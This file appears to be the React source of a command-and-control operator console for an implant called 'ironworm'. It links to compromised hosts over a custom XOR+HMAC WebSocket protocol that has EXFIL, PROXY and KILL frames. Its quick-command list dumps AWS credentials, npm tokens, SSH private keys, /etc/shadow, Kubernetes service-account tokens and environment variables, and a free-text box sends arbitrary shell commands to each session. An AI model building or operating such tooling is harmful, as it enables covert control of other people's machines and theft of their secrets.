import React, { useState, useRef, useCallback, useEffect } from "react";
import {
  encodeFrame, decodeFrame, buildPayload, parseFramePayload,
  FrameType, FrameTypeName, deriveKey, randomKey, keyToHex, hexToKey,
  HEADER_SIZE, HMAC_SIZE,
} from "../lib/c2-protocol";

const API_URL = (import.meta.env as Record<string, string>)["VITE_API_URL"] ?? "";

function wsBase(): string {
  if (API_URL) {
    const u = new URL(API_URL);
    return `${u.protocol === "https:" ? "wss:" : "ws:"}//${u.host}`;
  }
  return `${location.protocol === "https:" ? "wss:" : "ws:"}//${location.host}`;
}

interface Session {
  id:        string;
  hostname:  string;
  user:      string;
  os:        string;
  ip:        string;
  pid:       number;
  arch:      string;
  connectedAt: number;
  lastSeen:  number;
  alive:     boolean;
  tags:      string[];
}

interface LogEntry {
  ts:     number;
  dir:    "tx" | "rx" | "info" | "err";
  type:   string;
  seq:    number;
  hex:    string;
  parsed: unknown;
  hmacOk: boolean;
  sid?:   string;
}

const DIR_CLR: Record<string, string> = {
  tx:   "text-cyan-400",
  rx:   "text-green-400",
  info: "text-zinc-500",
  err:  "text-red-400",
};

const TYPE_CLR: Record<string, string> = {
  HEARTBEAT: "text-zinc-600",
  CMD:       "text-cyan-400",
  RESPONSE:  "text-green-400",
  EXFIL:     "text-red-400",
  AUTH:      "text-yellow-400",
  PROXY:     "text-purple-400",
  KILL:      "text-red-600",
  UPDATE:    "text-orange-400",
  ACK:       "text-zinc-500",
  ERROR:     "text-red-500",
};

const CMDS = [
  { label: "id",        payload: { cmd: "id" } },
  { label: "whoami",    payload: { cmd: "whoami" } },
  { label: "hostname",  payload: { cmd: "hostname" } },
  { label: "ifconfig",  payload: { cmd: "ip addr || ifconfig -a" } },
  { label: "ps aux",    payload: { cmd: "ps aux" } },
  { label: "env dump",  payload: { cmd: "env" } },
  { label: "netstat",   payload: { cmd: "ss -tlnp || netstat -tlnp" } },
  { label: "crontabs",  payload: { cmd: "crontab -l 2>/dev/null; cat /etc/cron* 2>/dev/null" } },
  { label: "loot /tmp", payload: { cmd: "find /tmp /var/tmp -type f 2>/dev/null | head -50" } },
  { label: "aws creds", payload: { cmd: "cat ~/.aws/credentials ~/.aws/config 2>/dev/null" } },
  { label: "npmrc",     payload: { cmd: "cat ~/.npmrc 2>/dev/null" } },
  { label: "gitcfg",   payload: { cmd: "cat ~/.gitconfig 2>/dev/null" } },
  { label: "k8s svc",  payload: { cmd: "cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null" } },
  { label: "ssh keys",  payload: { cmd: "find ~/.ssh /root/.ssh -type f 2>/dev/null | xargs cat 2>/dev/null" } },
  { label: "shadow",    payload: { cmd: "cat /etc/shadow 2>/dev/null || echo 'no root'" } },
  { label: "persist",   payload: { cmd: "cat ~/.bashrc ~/.profile 2>/dev/null; systemctl --user list-units 2>/dev/null" } },
  { label: "docker esc",payload: { cmd: "ls /.dockerenv 2>/dev/null; cat /proc/self/cgroup; docker ps 2>/dev/null" } },
];

function ts() { return new Date().toISOString().slice(11, 23); }

function truncHex(hex: string, n = 64): string {
  return hex.length > n ? hex.slice(0, n) + "…" : hex;
}

function elapsed(ms: number): string {
  const s = Math.floor(ms / 1000);
  if (s < 60)  return `${s}s`;
  if (s < 3600) return `${Math.floor(s / 60)}m ${s % 60}s`;
  return `${Math.floor(s / 3600)}h`;
}

export default function C2PollerPanel() {
  const [passphrase, setPassphrase] = useState("ironworm-c2-key");
  const [customKey,  setCustomKey]  = useState("");
  const [useCustom,  setUseCustom]  = useState(false);
  const [wsUrl,      setWsUrl]      = useState(() => `${wsBase()}/api/ws/c2`);
  const [connected,  setConnected]  = useState(false);
  const [sessions,   setSessions]   = useState<Session[]>([]);
  const [selected,   setSelected]   = useState<string | null>(null);
  const [log,        setLog]        = useState<LogEntry[]>([]);
  const [cmdInput,   setCmdInput]   = useState("");
  const [tab,        setTab]        = useState<"sessions"|"traffic"|"raw">("sessions");
  const [showKey,    setShowKey]    = useState(false);
  const [hexView,    setHexView]    = useState<LogEntry | null>(null);

  const wsRef    = useRef<WebSocket | null>(null);
  const seqRef   = useRef(0);
  const keyRef   = useRef<Uint8Array>(deriveKey("ironworm-c2-key"));
  const logRef   = useRef<HTMLDivElement>(null);

  useEffect(() => {
    keyRef.current = useCustom && customKey.length === 128
      ? hexToKey(customKey)
      : deriveKey(passphrase);
  }, [passphrase, customKey, useCustom]);

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
  }, [log]);

  const addLog = useCallback((entry: Omit<LogEntry, "ts">) => {
    setLog(p => [...p.slice(-800), { ...entry, ts: Date.now() }]);
  }, []);

  const sendFrame = useCallback(async (type: FrameType, payload: unknown, sid?: string) => {
    const ws = wsRef.current;
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    const seq  = seqRef.current++;
    const praw = buildPayload(sid ? { ...((payload as object) ?? {}), session_id: sid } : payload);
    const { bytes, hexDump } = await encodeFrame(type, praw, keyRef.current, seq);
    ws.send(bytes);
    addLog({
      dir: "tx", type: FrameTypeName[type] ?? "UNKNOWN", seq, hmacOk: true,
      hex:    hexDump,
      parsed: sid ? { ...((payload as object) ?? {}), session_id: sid } : payload,
      sid,
    });
  }, [addLog]);

  const connect = useCallback(() => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null; }
    addLog({ dir: "info", type: "CONNECT", seq: -1, hex: "", parsed: { url: wsUrl }, hmacOk: true });
    const ws = new WebSocket(wsUrl);
    ws.binaryType = "arraybuffer";
    wsRef.current = ws;

    ws.onopen = () => {
      setConnected(true);
      addLog({ dir: "info", type: "OPEN", seq: -1, hex: "", parsed: { url: wsUrl }, hmacOk: true });
      void sendFrame(FrameType.AUTH, { passphrase, version: "3.0", role: "operator" });
    };

    ws.onmessage = async (ev: MessageEvent) => {
      const raw = new Uint8Array(ev.data as ArrayBuffer);
      const frame = await decodeFrame(raw, keyRef.current);
      if (!frame) {
        addLog({ dir: "err", type: "DECODE_FAIL", seq: -1, hmacOk: false, hex: Array.from(raw.slice(0, 32)).map(b => b.toString(16).padStart(2,"0")).join(" "), parsed: null });
        return;
      }
      const parsed = parseFramePayload(frame.payload) as Record<string, unknown>;
      const hexDump = Array.from(raw).map(b => b.toString(16).padStart(2,"0")).join(" ");
      addLog({ dir: "rx", type: FrameTypeName[frame.type] ?? "UNKNOWN", seq: frame.seq, hmacOk: frame.hmacOk, hex: hexDump, parsed, sid: parsed["session_id"] as string | undefined });

      if (frame.type === FrameType.AUTH && parsed["sessions"]) {
        setSessions(parsed["sessions"] as Session[]);
      }
      if (frame.type === FrameType.HEARTBEAT && parsed["session"]) {
        const s = parsed["session"] as Session;
        setSessions(p => {
          const idx = p.findIndex(x => x.id === s.id);
          if (idx >= 0) { const n = [...p]; n[idx] = { ...n[idx]!, ...s, lastSeen: Date.now(), alive: true }; return n; }
          return [...p, { ...s, lastSeen: Date.now(), alive: true }];
        });
      }
      if (frame.type === FrameType.EXFIL) {
        setSessions(p => {
          const sid = parsed["session_id"] as string | undefined;
          if (!sid) return p;
          const idx = p.findIndex(x => x.id === sid);
          if (idx < 0) return p;
          const n = [...p];
          n[idx] = { ...n[idx]!, lastSeen: Date.now(), alive: true };
          return n;
        });
      }
    };

    ws.onerror = () => {
      addLog({ dir: "err", type: "WS_ERROR", seq: -1, hex: "", hmacOk: false, parsed: { url: wsUrl } });
    };

    ws.onclose = (ev) => {
      wsRef.current = null;
      setConnected(false);
      setSessions(p => p.map(s => ({ ...s, alive: false })));
      addLog({ dir: "info", type: "CLOSE", seq: -1, hex: "", hmacOk: true, parsed: { code: ev.code, reason: ev.reason } });
    };
  }, [wsUrl, passphrase, addLog, sendFrame]);

  const disconnect = useCallback(() => {
    wsRef.current?.close(1000, "operator");
    wsRef.current = null;
    setConnected(false);
  }, []);

  const sendCmd = useCallback(async (payload: unknown, sid?: string) => {
    await sendFrame(FrameType.CMD, payload, sid ?? selected ?? undefined);
  }, [sendFrame, selected]);

  const killSession = useCallback(async (sid: string) => {
    await sendFrame(FrameType.KILL, { reason: "operator" }, sid);
  }, [sendFrame]);

  const sendHb = useCallback(async () => {
    await sendFrame(FrameType.HEARTBEAT, { ts: Date.now() });
  }, [sendFrame]);

  const genKey = useCallback(() => {
    const k = randomKey();
    setCustomKey(keyToHex(k));
    setUseCustom(true);
  }, []);

  const selSession = sessions.find(s => s.id === selected);

  return (
    <div className="flex flex-col h-full bg-[#050505] text-white font-mono overflow-hidden">

      {/* Header */}
      <div className="border-b border-purple-900/30 px-5 py-3 bg-black/60 shrink-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className={`w-2 h-2 rounded-full ${connected ? "bg-purple-500 animate-pulse" : "bg-zinc-700"}`} />
            <span className="text-purple-400 font-bold tracking-[.2em] uppercase text-sm">C2 Poller</span>
            <span className="text-[9px] text-zinc-600 tracking-widest uppercase">XOR+HMAC-SHA256 Binary Protocol v3</span>
          </div>
          <div className="flex items-center gap-3 text-[9px]">
            <span className="text-zinc-600">SESSIONS <span className="text-white">{sessions.length}</span></span>
            <span className="text-zinc-600">ALIVE <span className="text-green-400">{sessions.filter(s=>s.alive).length}</span></span>
            <span className="text-zinc-600">FRAMES OUT <span className="text-cyan-400">{seqRef.current}</span></span>
          </div>
        </div>
      </div>

      <div className="flex flex-1 min-h-0 overflow-hidden">

        {/* Left sidebar — config + session list */}
        <div className="w-52 border-r border-white/[.04] flex flex-col bg-black/20 overflow-y-auto shrink-0">
          <div className="p-4 space-y-3">

            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">C2 WS Relay</label>
              <input value={wsUrl} onChange={e => setWsUrl(e.target.value)}
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-purple-900/60 placeholder-zinc-700"
                placeholder="ws://host/api/ws/c2" />
            </div>

            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="text-[9px] text-zinc-600 uppercase tracking-widest">Key</label>
                <button onClick={() => setShowKey(s => !s)} className="text-[8px] text-zinc-700 hover:text-zinc-400">{showKey?"HIDE":"SHOW"}</button>
              </div>
              <div className="flex items-center gap-1 mb-1">
                <button onClick={() => setUseCustom(false)} className={`text-[8px] px-2 py-1 border flex-1 ${!useCustom?"border-purple-800 text-purple-400":"border-zinc-800 text-zinc-600"}`}>passphrase</button>
                <button onClick={() => setUseCustom(true)}  className={`text-[8px] px-2 py-1 border flex-1 ${useCustom?"border-purple-800 text-purple-400":"border-zinc-800 text-zinc-600"}`}>raw hex</button>
              </div>
              {useCustom ? (
                <div className="flex gap-1">
                  <input value={customKey} onChange={e => setCustomKey(e.target.value)}
                    type={showKey ? "text" : "password"}
                    className="flex-1 bg-black/60 border border-white/[.06] text-[9px] px-2 py-1 text-green-400 focus:outline-none min-w-0"
                    placeholder="128-char hex (64 bytes)" />
                  <button onClick={genKey} className="px-2 text-[8px] border border-zinc-800 text-zinc-600 hover:text-zinc-300">↻</button>
                </div>
              ) : (
                <input value={passphrase} onChange={e => setPassphrase(e.target.value)}
                  type={showKey ? "text" : "password"}
                  className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-green-400 focus:outline-none"
                  placeholder="passphrase" />
              )}
              <div className="mt-1 text-[8px] text-zinc-700">
                XOR[0..32] + HMAC[32..64] · Frame overhead: {HEADER_SIZE + HMAC_SIZE}B
              </div>
            </div>

            <div className="flex gap-1">
              <button onClick={connected ? disconnect : connect}
                className={`flex-1 py-2 text-[9px] font-bold uppercase tracking-widest border transition-all ${connected ? "border-red-900/50 text-red-400 hover:border-red-700" : "border-purple-800/50 text-purple-400 hover:border-purple-600 bg-purple-950/20"}`}>
                {connected ? "■ Drop" : "▶ Link"}
              </button>
              {connected && (
                <button onClick={sendHb} className="px-3 text-[9px] border border-zinc-800 text-zinc-500 hover:text-zinc-300">♥</button>
              )}
            </div>

            <div className="border-t border-white/[.04] pt-3">
              <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Sessions ({sessions.length})</div>
              {sessions.length === 0 ? (
                <div className="text-[9px] text-zinc-800 text-center py-4">no implants</div>
              ) : (
                <div className="space-y-1">
                  {sessions.map(s => (
                    <button key={s.id} onClick={() => setSelected(x => x === s.id ? null : s.id)}
                      className={`w-full text-left px-2 py-2 border transition-all ${selected === s.id ? "border-purple-800 bg-purple-950/30" : "border-zinc-800 hover:border-zinc-600 bg-black/20"}`}>
                      <div className="flex items-center gap-1.5 mb-0.5">
                        <div className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${s.alive ? "bg-green-500" : "bg-zinc-700"}`} />
                        <span className="text-[10px] text-white font-bold truncate">{s.hostname}</span>
                      </div>
                      <div className="text-[8px] text-zinc-500 truncate">{s.user}@{s.os}</div>
                      <div className="text-[8px] text-zinc-700">{s.ip} · pid {s.pid}</div>
                      {s.alive && <div className="text-[8px] text-zinc-700 mt-0.5">seen {elapsed(Date.now() - s.lastSeen)} ago</div>}
                    </button>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Main pane */}
        <div className="flex-1 flex flex-col min-w-0 overflow-hidden">

          {/* Sub-tabs */}
          <div className="border-b border-white/[.04] px-4 py-2 flex items-center gap-1 shrink-0">
            {(["sessions","traffic","raw"] as const).map(t => (
              <button key={t} onClick={() => setTab(t)}
                className={`text-[9px] px-3 py-1.5 uppercase tracking-widest border transition-all ${tab === t ? "border-purple-800 text-purple-400 bg-purple-950/20" : "border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
                {t}
              </button>
            ))}
            {!connected && (
              <span className="ml-auto text-[8px] text-zinc-700 uppercase tracking-widest">● no link — frames shown as hex only</span>
            )}
          </div>

          {tab === "sessions" && (
            <div className="flex-1 overflow-y-auto p-4 min-h-0">
              {selSession ? (
                <div className="space-y-4">
                  <div className="border border-purple-900/30 p-4 bg-purple-950/10">
                    <div className="flex items-start justify-between mb-3">
                      <div>
                        <div className="text-sm font-bold text-white mb-0.5">{selSession.hostname}</div>
                        <div className="text-[9px] text-zinc-500">{selSession.user} · {selSession.os} · {selSession.arch} · {selSession.ip} · pid {selSession.pid}</div>
                        <div className="text-[8px] text-zinc-700 mt-0.5">ID: {selSession.id}</div>
                      </div>
                      <div className="flex gap-2">
                        <div className={`px-2 py-1 text-[8px] font-bold uppercase border ${selSession.alive ? "text-green-400 border-green-900" : "text-zinc-600 border-zinc-800"}`}>
                          {selSession.alive ? "alive" : "dead"}
                        </div>
                        <button onClick={() => killSession(selSession.id)}
                          className="px-2 py-1 text-[8px] font-bold uppercase border border-red-900/60 text-red-400 hover:bg-red-950/30">
                          KILL
                        </button>
                      </div>
                    </div>

                    <div className="mb-3">
                      <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Quick Commands</div>
                      <div className="flex flex-wrap gap-1">
                        {CMDS.map(c => (
                          <button key={c.label} onClick={() => sendCmd(c.payload, selSession.id)}
                            className="text-[8px] px-2 py-1 border border-zinc-800 text-zinc-500 hover:border-purple-800 hover:text-purple-400 uppercase transition-all">
                            {c.label}
                          </button>
                        ))}
                      </div>
                    </div>

                    <div>
                      <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Custom Command</div>
                      <div className="flex gap-2">
                        <input value={cmdInput} onChange={e => setCmdInput(e.target.value)}
                          onKeyDown={e => { if (e.key === "Enter" && cmdInput.trim()) { void sendCmd({ cmd: cmdInput }, selSession.id); setCmdInput(""); } }}
                          className="flex-1 bg-black/80 border border-zinc-800 text-[11px] px-3 py-2 text-green-400 focus:outline-none focus:border-purple-800 placeholder-zinc-700 font-mono"
                          placeholder="shell command or JSON payload…" />
                        <button onClick={() => { void sendCmd({ cmd: cmdInput }, selSession.id); setCmdInput(""); }}
                          disabled={!cmdInput.trim() || !connected}
                          className="px-4 text-[9px] uppercase tracking-widest border border-purple-800/50 text-purple-400 hover:bg-purple-950/20 disabled:opacity-30 transition-all">
                          TX
                        </button>
                      </div>
                    </div>
                  </div>

                  <div>
                    <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Session Traffic</div>
                    <div className="space-y-1 max-h-96 overflow-y-auto">
                      {log.filter(l => l.sid === selSession.id).map((l, i) => (
                        <div key={i} className={`text-[9px] flex items-start gap-2 font-mono py-0.5 border-b border-white/[.02] ${DIR_CLR[l.dir]}`}>
                          <span className="text-zinc-700 shrink-0">{new Date(l.ts).toISOString().slice(11,23)}</span>
                          <span className={`shrink-0 w-14 ${TYPE_CLR[l.type] ?? "text-zinc-500"}`}>{l.type}</span>
                          <span className="truncate text-zinc-500">{JSON.stringify(l.parsed).slice(0, 120)}</span>
                          {!l.hmacOk && <span className="text-red-600 font-bold shrink-0">HMAC!</span>}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              ) : (
                <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-3">
                  <div className="text-4xl opacity-20">⬡</div>
                  <p className="text-[10px] uppercase tracking-widest">Select a session to interact</p>
                  {!connected && (
                    <>
                      <p className="text-[9px] text-zinc-800">No link established — C2 relay not connected</p>
                      <p className="text-[8px] text-zinc-800 max-w-xs text-center">
                        Backend must implement <span className="text-zinc-600">/api/ws/c2</span> — raw TCP relay using the binary protocol.<br/>
                        Frame: MAGIC(4) VER(1) TYPE(1) SEQ(4) LEN(4) XOR(PAYLOAD) HMAC-SHA256(32)
                      </p>
                    </>
                  )}
                </div>
              )}
            </div>
          )}

          {tab === "traffic" && (
            <div ref={logRef} className="flex-1 overflow-y-auto p-3 min-h-0 space-y-0.5">
              {log.map((l, i) => (
                <button key={i} onClick={() => setHexView(hv => hv === l ? null : l)}
                  className={`w-full text-left flex items-center gap-2 text-[9px] font-mono py-0.5 px-2 hover:bg-white/[.03] transition-all ${DIR_CLR[l.dir]}`}>
                  <span className="text-zinc-700 shrink-0 w-24">{new Date(l.ts).toISOString().slice(11,23)}</span>
                  <span className={`shrink-0 font-bold w-4 ${l.dir === "tx" ? "text-cyan-600" : l.dir === "rx" ? "text-green-600" : "text-zinc-600"}`}>{l.dir === "tx" ? "↑" : l.dir === "rx" ? "↓" : "·"}</span>
                  <span className={`shrink-0 w-20 font-bold ${TYPE_CLR[l.type] ?? ""}`}>{l.type}</span>
                  <span className="shrink-0 text-zinc-700 w-8">#{l.seq >= 0 ? l.seq : "—"}</span>
                  {!l.hmacOk && <span className="text-red-600 font-bold shrink-0">❌HMAC</span>}
                  <span className="text-zinc-600 truncate">{JSON.stringify(l.parsed).slice(0,100)}</span>
                </button>
              ))}
              {log.length === 0 && (
                <div className="text-[9px] text-zinc-800 text-center py-8 uppercase tracking-widest">no traffic</div>
              )}
            </div>
          )}

          {tab === "raw" && (
            <div className="flex-1 overflow-y-auto p-4 min-h-0">
              {hexView ? (
                <div className="space-y-3">
                  <div className="flex items-center justify-between">
                    <div className="text-[9px] text-zinc-600 uppercase tracking-widest">
                      {hexView.dir.toUpperCase()} · {hexView.type} · seq#{hexView.seq} · {hexView.hmacOk ? "HMAC ✓" : "HMAC ✗"}
                    </div>
                    <button onClick={() => setHexView(null)} className="text-zinc-700 hover:text-zinc-400 text-xs">✕</button>
                  </div>
                  <pre className="text-[10px] text-green-400 font-mono whitespace-pre-wrap leading-relaxed border border-zinc-800 bg-black/60 p-4 max-h-80 overflow-y-auto">
                    {hexView.hex}
                  </pre>
                  <div className="text-[9px] text-zinc-600 uppercase tracking-widest">Decoded Payload</div>
                  <pre className="text-[10px] text-cyan-400 font-mono whitespace-pre-wrap leading-relaxed border border-zinc-800 bg-black/60 p-4 max-h-40 overflow-y-auto">
                    {JSON.stringify(hexView.parsed, null, 2)}
                  </pre>
                </div>
              ) : (
                <div className="space-y-2">
                  <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-3">Click any frame in the Traffic tab to inspect its hex dump here.</div>
                  <div className="border border-zinc-800 bg-black/40 p-4">
                    <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Protocol Reference</div>
                    <pre className="text-[10px] text-zinc-500 font-mono leading-relaxed">{`Frame Layout (big-endian):
  Offset  Size  Field
  0       4     MAGIC (0x49 0x52 0x4e 0x57 = "IRNW")
  4       1     VERSION (0x03)
  5       1     TYPE (0x01–0x0a)
  6       4     SEQNO (uint32)
  10      4     PAYLEN (uint32)
  ──── XOR-cipher boundary ────
  14      N     XOR(PAYLOAD, key[0..32])
  ──── HMAC boundary ──────────
  14+N    32    HMAC-SHA256(header+encPayload, key[32..64])

Total overhead: ${HEADER_SIZE + HMAC_SIZE} bytes per frame

Frame Types:
  0x01 HEARTBEAT  0x02 CMD       0x03 RESPONSE
  0x04 EXFIL      0x05 AUTH      0x06 PROXY
  0x07 KILL       0x08 UPDATE    0x09 ACK  0x0a ERROR`}
                    </pre>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
